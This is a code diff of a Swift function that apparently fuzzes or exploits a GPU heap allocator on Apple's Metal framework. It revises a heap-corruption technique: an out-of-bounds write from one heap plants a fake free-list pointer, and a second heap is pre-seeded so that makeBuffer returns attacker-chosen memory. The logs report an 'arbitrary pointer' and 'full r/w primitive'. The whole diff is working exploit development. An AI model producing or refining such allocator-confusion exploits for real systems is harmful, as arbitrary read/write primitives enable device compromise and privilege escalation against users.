@@ -256,26 +256,28 @@ func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
         }
         step("  ptr-class values found: \(foundPtrs)")
 
-        // Phase 4: plant fake free-list entry
-        // OBSERVED: allocator reads planted ptr and subtracts actual_size before returning.
-        // returned = planted - actual → to land AT va2, plant va2 + actual.
-        let plantTarget = va2 + UInt(actual)
-        step("── Planting fake free-list → plant=0x\(String(plantTarget,radix:16)) (va2+actual) target va2=0x\(String(va2,radix:16))")
-        var target = plantTarget
-        for i in 0..<8 {
-            p0[actual + i] = UInt8(target & 0xFF)
-            target >>= 8
-        }
-        target = plantTarget
-        for i in 8..<32 {
-            p0[actual + i] = UInt8(target & 0xFF)
-            target >>= 8
-            if i % 8 == 7 { target = plantTarget }
-        }
-        step("  planted va2+actual at h1[0..31] via h0 OOB")
+        // Phase 4: two-stage plant
+        // OBSERVED: allocator dereferences our planted pointer (reads *planted from GPU memory),
+        // then computes returned = planted - actual. Since h2 is zero-initialized, *va2 = 0,
+        // so returned = va2 - actual always. Fix: write (va2 + actual) into h2[0..7] so when
+        // allocator reads *va2 it gets (va2 + actual), then returned = (va2 + actual) - actual = va2.
+        //
+        // Stage A: write (va2 + actual) into h2[0..7] via p2 (direct, no OOB needed)
+        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)
+        var writeVal = va2 + UInt(actual)
+        step("── Stage A: write 0x\(String(writeVal,radix:16)) into h2[0..7] via p2")
+        for i in 0..<8 { p2[i] = UInt8(writeVal & 0xFF); writeVal >>= 8 }
+
+        // Stage B: plant va2 into h1[0..31] via h0 OOB (allocator free-list head → va2)
+        step("── Stage B: plant va2=0x\(String(va2,radix:16)) into h1[0..31] via h0 OOB")
+        var plantVal = va2
+        for i in 0..<8 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8 }
+        plantVal = va2
+        for i in 8..<32 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8; if i % 8 == 7 { plantVal = va2 } }
+        step("  done — allocator will: read h1[0]=va2, deref *va2=va2+actual, return va2+actual-actual=va2")
 
         // Phase 5: trigger allocator — call makeBuffer on corrupted h1
-        step("── h1.makeBuffer(256) with corrupted state")
+        step("── h1.makeBuffer(256) with two-stage corrupted state")
         let confused = h1.makeBuffer(length: 256, options: .storageModeShared)
         if let cb = confused {
             let cva = UInt(bitPattern: cb.contents())
@@ -283,16 +285,17 @@ func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
             let normalRange = va1_heap...(va1_heap + UInt(actual))
             if normalRange.contains(cva) {
                 step("  within h1 normal range — allocator robust against this overwrite")
-            } else if cva == va2 || (cva >= va2 && cva < va2 + UInt(actual)) {
+            } else if cva >= va2 && cva < va2 + UInt(actual) {
                 step("  *** IN h2 RANGE — ARBITRARY POINTER CONFIRMED ***")
                 step("  *** makeBuffer returned h2's memory — full r/w primitive ***")
+                step("  *** cva=0x\(String(cva,radix:16)) va2=0x\(String(va2,radix:16)) offset=\(cva - va2)")
             } else {
-                step("  *** OUTSIDE h1 range, not h2 — corrupted pointer 0x\(String(cva,radix:16)) ***")
-                step("  *** attacker-influenced allocation — partial primitive ***")
+                let delta = cva > va2 ? cva - va2 : va2 - cva
+                step("  OUTSIDE — cva=0x\(String(cva,radix:16)) delta_from_va2=\(Int(bitPattern: cva) - Int(bitPattern: va2))")
+                step("  partial primitive — allocator read our plant but arithmetic still off by 0x\(String(delta,radix:16))")
             }
         } else {
-            step("  nil — heap corrupted/exhausted (expected if allocator detected bad state)")
-            step("  snapshot + pointer scan above still reveals allocator format")
+            step("  nil — heap corrupted/exhausted")
         }
 
         step("── Allocator Confusion complete ────────────")
